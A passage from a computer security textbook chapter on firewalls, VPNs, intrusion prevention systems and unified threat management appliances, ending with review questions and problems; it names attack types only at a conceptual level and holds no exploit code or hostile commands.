(Example of NIDS Sensor Deployment) \\r\\nshows a configuration, in which the internal servers are protected from internal \\r\\nworkstations and vice versa. It also illustrates the common practice of placing \\r\\nthe DMZ on a different network interface on the external firewall from that \\r\\nused to access the internal networks.\\r\\nVirtual Private Networks\\r\\nIn today’s distributed computing environment, the virtual private network (VPN) \\r\\noffers an attractive solution to network managers. In essence, a VPN consists of a set \\r\\nof computers that interconnect by means of a relatively unsecure network and that \\r\\nmake use of encryption and special protocols to provide security. At each corporate \\r\\nsite, workstations, servers, and databases are linked by one or more LANs. The Inter\\ufffenet or some other public network can be used to interconnect sites, providing a cost \\r\\nsavings over the use of a private network and offloading the WAN management task \\r\\nto the public network provider. That same public network provides an access path \\r\\nfor telecommuters and other mobile employees to log on to corporate systems from \\r\\nremote sites.\\r\\nBut the manager faces a fundamental requirement: security. Use of a public \\r\\nnetwork exposes corporate traffic to eavesdropping and provides an entry point for \\r\\nunauthorized users. To counter this problem, a VPN is needed. In essence, a VPN \\r\\nuses encryption and authentication in the lower protocol layers to provide a secure \\r\\nconnection through an otherwise insecure network, typically the Internet. VPNs are \\r\\ngenerally cheaper than real private networks using private lines but rely on having \\r\\nthe same encryption and authentication system at both ends. The encryption may be \\r\\nperformed by firewall software or possibly by routers. The most common protocol \\r\\nmechanism used for this purpose is at the IP level and is known as IPSec.\\r\\nFigure 9.3 is a typical scenario of IPSec usage.1\\r\\n An organization maintains \\r\\nLANs at dispersed locations. Nonsecure IP traffic is used on each LAN. For traffic \\r\\noff site, through some sort of private or public WAN, IPSec protocols are used. These \\r\\nprotocols operate in networking devices, such as a router or firewall, that connect \\r\\neach LAN to the outside world. The IPSec networking device will typically encrypt \\r\\nand compress all traffic going into the WAN and decrypt and uncompress traffic \\r\\ncoming from the WAN; authentication may also be provided. These operations are \\r\\ntransparent to workstations and servers on the LAN. Secure transmission is also pos\\ufffesible with individual users who dial into the WAN. Such user workstations must \\r\\nimplement the IPSec protocols to provide security. They must also implement high \\r\\nlevels of host security, as they are directly connected to the wider Internet. This makes \\r\\nthem an attractive target for attackers attempting to access the corporate network.\\r\\n1\\r\\nDetails of IPSec will be provided in Chapter 22. For this discussion, all that we need to know is that IPSec \\r\\nadds one or more additional headers to the IP packet to support encryption and authentication functions.\\r\\nM09_STAL0611_04_GE_C09.indd 325 10/11/17 2:59 PM\\n\\n\\n326 CHAPTER 9 / FIREWALLS AND INTRUSION PREVENTION SYSTEMS\\r\\nA logical means of implementing an IPSec is in a firewall, as shown in \\r\\nFigure 9.3. If IPSec is implemented in a separate box behind (internal to) the fire\\ufffewall, then VPN traffic passing through the firewall in both directions is encrypted. \\r\\nIn this case, the firewall is unable to perform its filtering function or other security \\r\\nfunctions, such as access control, logging, or scanning for viruses. IPSec could be \\r\\nimplemented in the boundary router, outside the firewall. However, this device \\r\\nis likely to be less secure than the firewall, and thus less desirable as an IPSec \\r\\nplatform.\\r\\nDistributed Firewalls\\r\\nA distributed firewall configuration involves stand-alone firewall devices plus host\\ufffebased firewalls working together under a central administrative control. Figure 9.4 \\r\\nsuggests a distributed firewall configuration. Administrators can configure host\\uffferesident firewalls on hundreds of servers and workstation as well as configure per\\ufffesonal firewalls on local and remote user systems. Tools let the network administrator \\r\\nset policies and monitor security across the entire network. These firewalls protect \\r\\nagainst internal attacks and provide protection tailored to specific machines and \\r\\napplications. Stand-alone firewalls provide global protection, including internal fire\\ufffewalls and an external firewall, as discussed previously.\\r\\nWith distributed firewalls, it may make sense to establish both an internal and \\r\\nan external DMZ. Web servers that need less protection because they have less criti\\ufffecal information on them could be placed in an external DMZ, outside the external \\r\\nFigure 9.3 A VPN Security Scenario\\r\\nIP\\r\\nHeader\\r\\nIP\\r\\nPayload\\r\\nIP\\r\\nHeader\\r\\nIPSec\\r\\nHeader\\r\\nSecure IP\\r\\nPayload\\r\\nIP\\r\\nHeader\\r\\nIPSec\\r\\nHeader\\r\\nSecure IP\\r\\nPayload\\r\\nHeader\\r\\nIP\\r\\nIPSec\\r\\nHeader\\r\\nSecure IP\\r\\nPayload\\r\\nIP\\r\\nHeader\\r\\nIP\\r\\nPayload\\r\\nFirewall\\r\\nwith IPSec\\r\\nEthernet\\r\\nswitch\\r\\nEthernet\\r\\nswitch\\r\\nUser system\\r\\nwith IPSec\\r\\nFirewall\\r\\nwith IPSec\\r\\nPublic (Internet)\\r\\nor Private Network\\r\\nM09_STAL0611_04_GE_C09.indd 326 10/11/17 2:59 PM\\n\\n\\n9.5 / FIREWALL LOCATION AND CONFIGURATIONS 327\\r\\nfirewall. What protection is needed is provided by host-based firewalls on these \\r\\nservers.\\r\\nAn important aspect of a distributed firewall configuration is security monitor\\ufffeing. Such monitoring typically includes log aggregation and analysis, firewall statistics, \\r\\nand fine-grained remote monitoring of individual hosts if needed.\\r\\nFigure 9.4 Example Distributed Firewall Configuration\\r\\nInternet\\r\\nRemote\\r\\nusers\\r\\nExternal\\r\\nDMZ network\\r\\nWeb\\r\\nservers(s)\\r\\nWeb\\r\\nservers(s)\\r\\nE-mail\\r\\nserver\\r\\nInternal protected network\\r\\nApplication and database servers\\r\\nWorkstations\\r\\nHost-resident\\r\\nf irewall\\r\\nLAN\\r\\nswitch\\r\\nInternal\\r\\nf irewall\\r\\nExternal\\r\\nf irewall\\r\\nBoundary\\r\\nrouter\\r\\nDNS\\r\\nserver\\r\\nInternal DMZ network\\r\\nLAN\\r\\nswitch\\r\\nM09_STAL0611_04_GE_C09.indd 327 10/11/17 2:59 PM\\n\\n\\n328 CHAPTER 9 / FIREWALLS AND INTRUSION PREVENTION SYSTEMS\\r\\nSummary of Firewall Locations and Topologies\\r\\nWe can now summarize the discussion from Sections 9.4 and 9.5 to define a spectrum \\r\\nof firewall locations and topologies. The following alternatives can be identified:\\r\\n• Host-resident firewall: This category includes personal firewall software and \\r\\nfirewall software on servers, both physical and virtual. Such firewalls can be \\r\\nused alone or as part of an in-depth firewall deployment.\\r\\n• Screening router: A single router between internal and external networks with \\r\\nstateless or full packet filtering. This arrangement is typical for small office/\\r\\nhome office (SOHO) applications.\\r\\n• Single bastion inline:A single firewall physical or virtual device located between \\r\\nan internal and external router (e.g., Figure 9.1a). The firewall may implement \\r\\nstateful filters and/or application proxies. This is the typical firewall appliance \\r\\nconfiguration for small to medium-sized organizations.\\r\\n• Single bastion T: Similar to single bastion inline, but has a third network inter\\ufffeface on bastion to a DMZ where externally visible servers are placed. Again, \\r\\nthis is a common appliance configuration for medium to large organizations.\\r\\n• Double bastion inline: Figure 9.2 illustrates this configuration, where the DMZ \\r\\nis sandwiched between bastion firewalls. This configuration is common for large \\r\\nbusinesses and government organizations.\\r\\n• Double bastion T: Figure 8.5 illustrates this configuration. The DMZ is on a sep\\ufffearate network interface on the bastion firewall. This configuration is also com\\ufffemon for large businesses and government organizations and may be required.\\r\\n• Distributed firewall configuration: Illustrated in Figure 9.4. This configuration \\r\\nis used by some large businesses and government organizations.\\r\\n9.6 INTRUSION PREVENTION SYSTEMS\\r\\nA further addition to the range of security products is the intrusion prevention system \\r\\n(IPS), also known as intrusion detection and prevention system (IDPS). It is an exten\\ufffesion of an IDS that includes the capability to attempt to block or prevent detected \\r\\nmalicious activity. Like an IDS, an IPS can be host-based, network-based, or distrib\\ufffeuted/hybrid, as we discussed in Chapter 8. Similarly, it can use anomaly detection to \\r\\nidentify behavior that is not that of legitimate users, or signature/heuristic detection \\r\\nto identify known malicious behavior.\\r\\nOnce an IDS has detected malicious activity, it can respond by modifying \\r\\nor blocking network packets across a perimeter or into a host, or by modifying or \\r\\nblocking system calls by programs running on a host. Thus, a network IPS can block \\r\\ntraffic, as a firewall does, but makes use of the types of algorithms developed for \\r\\nIDSs to determine when to do so. It is a matter of terminology whether a network \\r\\nIPS is considered a separate, new type of product, or simply another form of firewall.\\r\\nHost-Based IPS\\r\\nA host-based IPS (HIPS) can make use of either signature/heuristic or anomaly \\r\\ndetection techniques to identify attacks. In the former case, the focus is on the specific \\r\\nM09_STAL0611_04_GE_C09.indd 328 10/11/17 2:59 PM\\n\\n\\n9.6 / INTRUSION PREVENTION SYSTEMS 329\\r\\ncontent of application network traffic, or of sequences of system calls, looking for \\r\\npatterns that have been identified as malicious. In the case of anomaly detection, the \\r\\nIPS is looking for behavior patterns that indicate malware. Examples of the types of \\r\\nmalicious behavior addressed by a HIPS include the following:\\r\\n• Modification of system resources: Rootkits, Trojan horses, and backdoors oper\\ufffeate by changing system resources, such as libraries, directories, registry settings, \\r\\nand user accounts.\\r\\n• Privilege-escalation exploits: These attacks attempt to give ordinary users root \\r\\naccess.\\r\\n• Buffer-overflow exploits: These attacks will be described in Chapter 10.\\r\\n• Access to e-mail contact list: Many worms spread by mailing a copy of them\\ufffeselves to addresses in the local system’s e-mail address book.\\r\\n• Directory traversal: A directory traversal vulnerability in a Web server allows \\r\\nthe hacker to access files outside the range of what a server application user \\r\\nwould normally need to access.\\r\\nAttacks such as these result in behaviors that can be analyzed by a HIPS. The \\r\\nHIPS capability can be tailored to the specific platform. A set of general-purpose \\r\\ntools may be used for a desktop or server system. Some HIPS packages are designed \\r\\nto protect specific types of servers, such as Web servers and database servers. In this \\r\\ncase, the HIPS looks for particular application attacks.\\r\\nIn addition to signature and anomaly-detection techniques, a HIPS can use \\r\\na sandbox approach. Sandboxes are especially suited to mobile code, such as Java \\r\\napplets and scripting languages. The HIPS quarantines such code in an isolated sys\\ufffetem area, then runs the code and monitors its behavior. If the code violates pre\\ufffedefined policies or matches predefined behavior signatures, it is halted and prevented \\r\\nfrom executing in the normal system environment.\\r\\n[ROBB06a] lists the following as areas for which a HIPS typically offers desk\\ufffetop protection:\\r\\n• System calls: The kernel controls access to system resources such as memory, \\r\\nI/O devices, and processor. To use these resources, user applications invoke \\r\\nsystem calls to the kernel. Any exploit code will execute at least one system \\r\\ncall. The HIPS can be configured to examine each system call for malicious \\r\\ncharacteristics.\\r\\n• File system access: The HIPS can ensure that file access system calls are not \\r\\nmalicious and meet established policy.\\r\\n• System registry settings: The registry maintains persistent configuration infor\\ufffemation about programs and is often maliciously modified to extend the life of \\r\\nan exploit. The HIPS can ensure that the system registry maintains its integrity.\\r\\n• Host input/output: I/O communications, whether local or network-based, \\r\\ncan propagate exploit code and malware. The HIPS can examine and enforce \\r\\nproper client interaction with the network and its interaction with other devices.\\r\\nTHE ROLE OF HIPS Many industry observers see the enterprise endpoint, including \\r\\ndesktop and laptop systems, as now the main target for hackers and criminals, more \\r\\nso than network devices [ROBB06b]. Thus, security vendors are focusing more on \\r\\nM09_STAL0611_04_GE_C09.indd 329 10/11/17 2:59 PM\\n\\n\\n330 CHAPTER 9 / FIREWALLS AND INTRUSION PREVENTION SYSTEMS\\r\\ndeveloping endpoint security products. Traditionally, endpoint security has been pro\\ufffevided by a collection of distinct products, such as antivirus, antispyware, antispam, and \\r\\npersonal firewalls. The HIPS approach is an effort to provide an integrated, single\\ufffeproduct suite of functions. The advantages of the integrated HIPS approach are that \\r\\nthe various tools work closely together, threat prevention is more comprehensive, \\r\\nand management is easier.\\r\\nIt may be tempting to think that endpoint security products such as HIPS, if \\r\\nsophisticated enough, eliminate or at least reduce the need for network-level devices. \\r\\nFor example, the San Diego Supercomputer Center reports that over a four-year \\r\\nperiod, there were no intrusions on any of its managed machines, in a configuration \\r\\nwith no firewalls and just endpoint security protection [SING03]. Nevertheless, a \\r\\nmore prudent approach is to use HIPS as one element in a defense-in-depth strategy \\r\\nthat involves network-level devices, such as either firewalls or network-based IPSs.\\r\\nNetwork-Based IPS\\r\\nA network-based IPS (NIPS) is in essence an inline NIDS with the authority to \\r\\nmodify or discard packets and tear down TCP connections. As with a NIDS, a NIPS \\r\\nmakes use of techniques such as signature/heuristic detection and anomaly detection.\\r\\nAmong the techniques used in a NIPS but not commonly found in a firewall \\r\\nis flow data protection. This requires that the application payload in a sequence of \\r\\npackets be reassembled. The IPS device applies filters to the full content of the flow \\r\\nevery time a new packet for the flow arrives. When a flow is determined to be mali\\ufffecious, the latest and all subsequent packets belonging to the suspect flow are dropped.\\r\\nIn terms of the general methods used by a NIPS device to identify malicious \\r\\npackets, the following are typical:\\r\\n• Pattern matching: Scans incoming packets for specific byte sequences (the sig\\ufffenature) stored in a database of known attacks.\\r\\n• Stateful matching: Scans for attack signatures in the context of a traffic stream \\r\\nrather than individual packets.\\r\\n• Protocol anomaly: Looks for deviation from standards set forth in RFCs.\\r\\n• Traffic anomaly: Watches for unusual traffic activities, such as a flood of UDP \\r\\npackets or a new service appearing on the network.\\r\\n• Statistical anomaly: Develops baselines of normal traffic activity and through\\ufffeput, and alerts on deviations from those baselines.\\r\\nDistributed or Hybrid IPS\\r\\nThe final category of IPS is in a distributed or hybrid approach. This gathers data \\r\\nfrom a large number of host and network-based sensors, relays this intelligence to a \\r\\ncentral analysis system able to correlate, and analyze the data, which can then return \\r\\nupdated signatures and behavior patterns to enable all of the coordinated systems \\r\\nto respond and defend against malicious behavior. A number of such systems have \\r\\nbeen proposed. One of the best known is the digital immune system.\\r\\nDIGITAL IMMUNE SYSTEM The digital immune system is a comprehensive \\r\\ndefense against malicious behavior caused by malware, developed by IBM \\r\\nM09_STAL0611_04_GE_C09.indd 330 10/11/17 2:59 PM\\n\\n\\n9.6 / INTRUSION PREVENTION SYSTEMS 331\\r\\n[KEPH97a, KEPH97b, WHIT99], and subsequently refined by Symantec [SYMA01] \\r\\nand incorporated into its Central Quarantine produce [SYMA05]. The motivation for \\r\\nthis development includes the rising threat of Internet-based malware, the increasing \\r\\nspeed of its propagation provided by the Internet, and the need to acquire a global \\r\\nview of the situation.\\r\\nIn response to the threat posed by these Internet-based capabilities, IBM devel\\ufffeoped the original prototype digital immune system. This system expands on the use of \\r\\nsandbox analysis discussed in Section 6.10 and provides a general-purpose emulation \\r\\nand malware detection system. The objective of this system is to provide rapid response \\r\\ntime so malware can be stamped out almost as soon as they are introduced. When new \\r\\nmalware enters an organization, the immune system automatically captures it, analyzes \\r\\nit, adds detection and shielding for it, removes it, and passes information about it to \\r\\nclient systems, so the malware can be detected before it is allowed to run elsewhere.\\r\\nThe success of the digital immune system depends on the ability of the malware \\r\\nanalysis system to detect new and innovative malware strains. By constantly analyzing \\r\\nand monitoring malware found in the wild, it should be possible to continually update \\r\\nthe digital immune software to keep up with the threat.\\r\\nFigure 9.5 shows an example of a hybrid architecture designed originally to \\r\\ndetect worms [SIDI05]. The system works as follows (numbers in figure refer to \\r\\nnumbers in the following list):\\r\\n1. Sensors deployed at various network and host locations detect potential mal\\ufffeware scanning, infection, or execution. The sensor logic can also be incorporated \\r\\nin IDS sensors.\\r\\n2. The sensors send alerts and copies of detected malware to a central server, which \\r\\ncorrelates and analyzes this information. The correlation server determines the \\r\\nlikelihood that malware is being observed and its key characteristics.\\r\\n3. The server forwards its information to a protected environment, where the poten\\ufffetial malware may be sandboxed for analysis and testing.\\r\\n4. The protected system tests the suspicious software against an appropriately instru\\ufffemented version of the targeted application to identify the vulnerability.\\r\\n5. The protected system generates one or more software patches and tests these.\\r\\n6. If the patch is not susceptible to the infection and does not compromise the \\r\\napplication’s functionality, the system sends the patch to the application host \\r\\nto update the targeted application.\\r\\nSnort Inline\\r\\nWe introduced Snort in Section 8.9 as a lightweight intrusion detection system. \\r\\nA modified version of Snort, known as Snort Inline [KURU12], enhances Snort to \\r\\nfunction as an intrusion prevention system. Snort Inline adds three new rule types \\r\\nthat provide intrusion prevention features:\\r\\n• Drop: Snort rejects a packet based on the options defined in the rule and logs \\r\\nthe result.\\r\\n• Reject: Snort rejects a packet and logs the result. In addition, an error message \\r\\nis returned. In the case of TCP, this is a TCP reset message, which resets the TCP \\r\\nM09_STAL0611_04_GE_C09.indd 331 10/11/17 2:59 PM\\n\\n\\n332 CHAPTER 9 / FIREWALLS AND INTRUSION PREVENTION SYSTEMS\\r\\nconnection. In the case of UDP, an ICMP port unreachable message is sent to \\r\\nthe originator of the UDP packet.\\r\\n• Sdrop: Snort rejects a packet but does not log the packet.\\r\\nSnort Inline also includes a replace option, which allows the Snort user to \\r\\nmodify packets rather than drop them. This feature is useful for a honeypot imple\\ufffementation [SPIT03]. Instead of blocking detected attacks, the honeypot modifies \\r\\nand disables them by modifying packet content. Attackers launch their exploits, \\r\\nwhich travel the Internet and hit their intended targets, but Snort Inline disables the \\r\\nattacks, which ultimately fail. The attackers see the failure but cannot figure out why \\r\\nit occurred. The honeypot can continue to monitor the attackers while reducing the \\r\\nrisk of harming remote systems.\\r\\n9.7 EXAMPLE: UNIFIED THREAT MANAGEMENT PRODUCTS\\r\\nIn the past few chapters, we have reviewed a number of approaches to countering mali\\ufffecious software and network-based attacks, including antivirus and antiworm products, \\r\\nIPS and IDS, and firewalls. The implementation of all of these systems can provide \\r\\nan organization with a defense in depth using multiple layers of filters and defense \\r\\nmechanisms to thwart attacks. The downside of such a piecemeal implementation is \\r\\nthe need to configure, deploy, and manage a range of devices and software packages. \\r\\nIn addition, deploying a number of devices in sequence can reduce performance.\\r\\nFigure 9.5 Placement of Malware Monitors \\r\\nSource: Based on [SIDI05]. Sidiroglou, S., and Keromytis, A. “Countering Network \\r\\nWorms Through Automatic Patch Generation.”, Columbia University, Figure 1, page 3, \\r\\nNovember-December 2005. http://www1.cs.columbia.edu/~angelos/Papers/2005/j6ker3\\r\\n.pdf IEEE.\\r\\nInternet\\r\\nRemote sensor\\r\\nHoneypot\\r\\nPassive\\r\\nsensor\\r\\nFirewall\\r\\nsensor\\r\\nCorrelation\\r\\nserver\\r\\nApplication Host\\r\\nInstrumented applications\\r\\nSandboxed\\r\\nenvironment\\r\\nEnterprise network\\r\\nHypothesis testing\\r\\nand analysis\\r\\nPatch\\r\\ngeneration\\r\\n3. Forward\\r\\nfeatures\\r\\n5. Possible fix generation\\r\\n6. Application update\\r\\n4. Vulnerability \\r\\ntesting and \\r\\nidentification\\r\\n1. Malware scanning \\r\\nor infection attempts\\r\\n2. Notifications\\r\\n1. Malware \\r\\n execution\\r\\nM09_STAL0611_04_GE_C09.indd 332 10/11/17 2:59 PM\\n\\n\\n9.7 / EXAMPLE: UNIFIED THREAT MANAGEMENT PRODUCTS 333\\r\\nOne approach to reducing the administrative and performance burden is to \\r\\nreplace all inline network products (firewall, IPS, IDS, VPN, antispam, antisypware, \\r\\nand so on) with a single device that integrates a variety of approaches to dealing with \\r\\nnetwork-based attacks. The market analyst firm IDC refers to such a device as a unified \\r\\nthreat management (UTM) system and defines UTM as follows: “Products that include \\r\\nmultiple security features integrated into one box. To be included in this category, [an \\r\\nappliance] must be able to perform network firewalling, network intrusion detection \\r\\nand prevention and gateway anti-virus. All of the capabilities in the appliance need not \\r\\nbe used concurrently, but the functions must exist inherently in the appliance.”\\r\\nA significant issue with a UTM device is performance, both throughput and \\r\\nlatency. [MESS06] reports that typical throughput losses for current commercial \\r\\ndevices is 50%. Thus, customers are advised to get very high-performance, high\\ufffethroughput devices to minimize the apparent performance degradation.\\r\\nFigure 9.6 is a typical UTM appliance architecture. The following functions are \\r\\nnoteworthy:\\r\\n1. Inbound traffic is decrypted if necessary before its initial inspection. If the device \\r\\nfunctions as a VPN boundary node, then IPSec decryption would take place here.\\r\\nFigure 9.6 Unified Threat Management Appliance\\r\\nSource: Based on [JAME06].\\r\\nClean controlled traf f ic\\r\\nRaw incoming traf f ic\\r\\nRouting module\\r\\nVPN module\\r\\nFirewall module\\r\\nAntivirus\\r\\nengine\\r\\nHeuristic\\r\\nscan\\r\\nengine\\r\\nAnomaly\\r\\ndetection\\r\\nActivity\\r\\ninspection\\r\\nengine\\r\\nWeb f iltering module\\r\\nAntispam module\\r\\nVPN module\\r\\nBandwidth shaping module\\r\\nIDS engine\\r\\nIPS engine\\r\\nLogging and reporting module\\r\\nData analysis engine\\r\\nM09_STAL0611_04_GE_C09.indd 333 10/11/17 2:59 PM\\n\\n\\n334 CHAPTER 9 / FIREWALLS AND INTRUSION PREVENTION SYSTEMS\\r\\n2. An initial firewall module filters traffic, discarding packets that violate rules \\r\\nand/or passing packets that conform to rules set in the firewall policy.\\r\\n3. Beyond this point, a number of modules process individual packets and flows of \\r\\npackets at various protocols levels. In this particular configuration, a data analysis \\r\\nengine is responsible for keeping track of packet flows and coordinating the work \\r\\nof antivirus, IDS, and IPS engines.\\r\\n4. The data analysis engine also reassembles multipacket payloads for content analy\\ufffesis by the antivirus engine and the Web filtering and antispam modules.\\r\\n5. Some incoming traffic may need to be reencrypted to maintain security of the flow \\r\\nwithin the enterprise network.\\r\\n6. All detected threats are reported to the logging and reporting module, which is \\r\\nused to issue alerts for specified conditions and for forensic analysis.\\r\\n7. The bandwidth-shaping module can use various priority and quality-of-service \\r\\n(QoS) algorithms to optimize performance.\\r\\nAs an example of the scope of a UTM appliance, Tables 9.3 and 9.4 list some \\r\\nof the attacks that the UTM device marketed by Secure Computing is designed to \\r\\ncounter.\\r\\nAttacks and Internet Threats Protections\\r\\nTCP\\r\\n• Invalid port numbers\\r\\n• Invalid sequence\\r\\n• Numbers\\r\\n• SYN floods\\r\\n• XMAS tree attacks\\r\\n• Invalid CRC values\\r\\n• Zero length\\r\\n• Random data as TCP\\r\\n• Header\\r\\n• TCP hijack attempts\\r\\n• TCP spoofing attacks\\r\\n• Small PMTU attacks\\r\\n• SYN attack\\r\\n• Script Kiddie attacks\\r\\n• Packet crafting: different \\r\\nTCP options set\\r\\n• Enforce correct \\r\\nTCP flags\\r\\n• Enforce TCP \\r\\nheader length\\r\\n• Ensures a proper \\r\\nthree-way handshake\\r\\n• Closes TCP session \\r\\ncorrectly\\r\\n• 2 sessions one on \\r\\nthe inside and one \\r\\nof the outside\\r\\n• Enforce correct \\r\\nTCP flag usage\\r\\n• Manages TCP \\r\\nsession timeouts\\r\\n• Blocks SYN attack\\r\\n• Reassembly of packets \\r\\nensuring correctness\\r\\n• Properly handles TCP \\r\\ntimeouts and retransmits \\r\\ntimers\\r\\n• All TCP proxies are \\r\\nprotected\\r\\n• Traffic Control through \\r\\naccess lists\\r\\n• Drop TCP packets on \\r\\nports not open\\r\\n• Proxies block packet \\r\\ncrafting\\r\\nUDP\\r\\n• Invalid UDP packets\\r\\n• Random UDP data \\r\\nto bypass rules\\r\\n• Connection pediction\\r\\n• UDP port scanning\\r\\n• Verify correct UDP packet\\r\\n• Drop UDP packets on ports not open\\r\\nTable 9.3 Sidewinder G2 Security Appliance Attack Protections Summary—Transport-Level Examples\\r\\nM09_STAL0611_04_GE_C09.indd 334 10/11/17 2:59 PM\\n\\n\\n9.7 / EXAMPLE: UNIFIED THREAT MANAGEMENT PRODUCTS 335\\r\\nAttacks and Internet Threats Protections\\r\\nDNS\\r\\nIncorrect NXDOMAIN responses from AAAA \\r\\nqueries could cause denial-of-service conditions.\\r\\n• Does not allow negative caching\\r\\n• Prevents DNS cache poisoning\\r\\nISC BIND 9 before 9.2.1 allows remote attackers to \\r\\ncause a denial of service (shutdown) via a malformed \\r\\nDNS packet that triggers an error condition that is \\r\\nnot properly handled when the rdataset parameter to \\r\\nthe dns_message_findtype() function in message.c is \\r\\nnot NULL.\\r\\n• Sidewinder G2 prevents malicious use of improperly\\r\\nformed DNS messages to affect firewall operations.\\r\\n• Prevents DNS query attacks\\r\\n• Prevents DNS answer attacks\\r\\nDNS information prevention and other DNS \\r\\nabuses.\\r\\n• Prevent zone transfers and queries\\r\\n• True split DNS protect by Type Enforcement \\r\\ntechnology to allow public and private DNS zones.\\r\\n• Ability to turn off recursion\\r\\nFTP\\r\\n• FTP bounce attack\\r\\n• PASS attack\\r\\n• FTP Port injection attacks\\r\\n• TCP segmentation attack\\r\\n• Sidewinder G2 has the ability to filter FTP \\r\\ncommands to prevent these attacks\\r\\n• True network separation prevents segmentation \\r\\nattacks.\\r\\nSQL\\r\\nSQL Net man in the middle attacks • Smart proxy protected by Type Enforcement \\r\\ntechnology\\r\\n• Hide Internal DB through nontransparent \\r\\nconnections.\\r\\nReal-Time Streaming Protocol (RTSP)\\r\\n• Buffer overflow\\r\\n• Denial of service\\r\\n• Smart proxy protected by Type Enforcement \\r\\ntechnology\\r\\n• Protocol validation\\r\\n• Denies multicast traffic\\r\\n• Checks setup and teardown methods\\r\\n• Verifies PNG and RTSP protocol and discards all \\r\\nothers\\r\\n• Auxiliary port monitoring\\r\\nSNMP\\r\\n• SNMP flood attacks\\r\\n• Default community attack\\r\\n• Brute force attack\\r\\n• SNMP put attack\\r\\n• Filter SNMP version traffic 1, 2c\\r\\n• Filter Read, Write, and Notify messages\\r\\n• Filter OIDS\\r\\n• Filter PDU (Protocol Data Unit)\\r\\nSSH\\r\\n• Challenge Response buffer overflows\\r\\n• SSHD allows users to override “Allowed \\r\\nAuthentications”\\r\\n• OpenSSH buffer_append_space buffer overflow\\r\\n• OpenSSH/PAM challenge Response buffer \\r\\noverflow\\r\\n• OpenSSH channel code offer-by-one\\r\\nSidewinder G2 v6.x’s embedded Type Enforcement \\r\\ntechnology strictly limits the capabilities of Secure \\r\\nComputing’s modified versions of the OpenSSH \\r\\ndaemon code.\\r\\nTable 9.4 Sidewinder G2 Security Appliance Attack Protections Summary—Application-Level \\r\\nExamples\\r\\n(Continued)\\r\\nM09_STAL0611_04_GE_C09.indd 335 10/11/17 2:59 PM\\n\\n\\n336 CHAPTER 9 / FIREWALLS AND INTRUSION PREVENTION SYSTEMS\\r\\nAttacks and Internet Threats Protections\\r\\nSMTP\\r\\n• Sendmail buffer overflows\\r\\n• Sendmail denial of service attacks\\r\\n• Remote buffer overflow in sendmail\\r\\n• Sendmail address parsing buffer overflow\\r\\n• SMTP protocol anomalies\\r\\n• Split Sendmail architecture protected by Type \\r\\nEnforcement technology\\r\\n• Sendmail customized for controls\\r\\n• Prevents buffer overflows through Type \\r\\nEnforcement technology\\r\\n• Sendmail checks SMTP protocol anomalies\\r\\n• SMTP worm attacks\\r\\n• SMTP mail flooding\\r\\n• Relay attacks\\r\\n• Viruses, Trojans, worms\\r\\n• E-mail addressing spoofing\\r\\n• MIME attacks\\r\\n• Phishing e-mails\\r\\n• Protocol validation\\r\\n• Antispam filter\\r\\n• Mail filters—size, keyword\\r\\n• Signature antivirus\\r\\n• Antirelay\\r\\n• MIME/Antivirus filter\\r\\n• Firewall antivirus\\r\\n• Antiphishing through virus scanning\\r\\nSpyware Applications\\r\\n• Adware used for collecting information for market\\ufffeing purposes\\r\\n• Stalking horses\\r\\n• Trojan horses\\r\\n• Malware\\r\\n• Backdoor Santas\\r\\n• SmartFilter® URL filtering capability built in with \\r\\nSidewinder G2 can be configured to filter Spyware \\r\\nURLs, preventing downloads.\\r\\nTable 9.4 (Continued)\\r\\n9.8 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\r\\nKey Terms\\r\\napplication-level gateway\\r\\nbastion host\\r\\ncircuit-level gateway\\r\\ndemilitarized zone (DMZ)\\r\\ndistributed firewalls\\r\\nfirewall\\r\\nhost-based firewall\\r\\nhost-based IPS\\r\\nintrusion prevention system \\r\\n(IPS)\\r\\nIP address spoofing\\r\\nIP security (IPSec)\\r\\nnetwork-based IPS\\r\\npacket filtering firewall\\r\\npersonal firewall\\r\\nproxy\\r\\nstateful packet inspection firewall\\r\\ntiny fragment attack\\r\\nunified threat management \\r\\n(UTM)\\r\\nvirtual private network (VPN)\\r\\nReview Questions\\r\\n9.1 List the different types of firewalls.\\r\\n9.2 List four characteristics used by firewalls to control access and enforce a security policy.\\r\\n9.3 Which type of attacks is possible on a packet filtering firewall?\\r\\n9.4 How does a traditional packet filter make filtering decision?\\r\\n9.5 What is the difference between a packet filtering firewall and a stateful inspection \\r\\nfirewall?\\r\\n9.6 What is the difference between a gateway and a firewall?\\r\\nM09_STAL0611_04_GE_C09.indd 336 10/11/17 2:59 PM\\n\\n\\n9.8 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 337\\r\\n9.7 Describe a situation where circuit-level gateways can be used.\\r\\n9.8 How do FTP and Telnet work through a firewall?\\r\\n9.9 What are the common characteristics of a bastion host?\\r\\n9.10 Why is it useful to have host-based firewalls?\\r\\n9.11 What is a DMZ network and what types of systems would you expect to find on such \\r\\nnetworks?\\r\\n9.12 What are the differences between an IDS, an IPS, and a firewall?\\r\\n9.13 List the types of malicious behaviors addressed by a Host-based Intrusion Prevention \\r\\nSystem (HIPS)?\\r\\n9.14 What are the different places an IPS can be based?\\r\\n9.15 List at least three malicious behaviors addressed by HIPS.\\r\\n9.16 List a few methods used by a NIPS device to identify malicious packets.\\r\\nProblems\\r\\n9.1 As was mentioned in Section 9.3, the application gateway does not permit an end-to\\ufffeend TCP connection; rather, it sets up two TCP connections, one between itself and \\r\\na TCP user on an inner host and one between itself and a TCP user on an outside \\r\\nhost. The disadvantage of this approach is the additional processing overhead on each \\r\\nconnection since the gateway must examine and forward all traffic in both directions. \\r\\nDescribe at least one more limitation of this approach which is not discussed.\\r\\n9.2 In an IPv4 packet, the size of the payload in the first fragment, in octets, is equal to \\r\\nTotal Length - (4 * Internet Header Length). If this value is less than the required \\r\\nminimum (8 octets for TCP), then this fragment and the entire packet are rejected. \\r\\nSuggest an alternative method of achieving the same result using only the Fragment \\r\\nOffset field.\\r\\n9.3 RFC 791, the IPv4 protocol specification, describes a reassembly algorithm that results \\r\\nin new fragments overwriting any overlapped portions of previously received frag\\ufffements. Given such a reassembly implementation, an attacker could construct a series \\r\\nof packets in which the lowest (zero-offset) fragment would contain innocuous data \\r\\n(and thereby be passed by administrative packet filters) and in which some subsequent \\r\\npacket having a nonzero offset would overlap TCP header information (destination \\r\\nport, for instance) and cause it to be modified. The second packet would be passed \\r\\nthrough most filter implementations because it does not have a zero fragment offset. \\r\\nSuggest a method that could be used by a packet filter to counter this attack.\\r\\n9.4 Table 9.5 shows a sample of a packet filter firewall ruleset for an imaginary network of \\r\\nIP 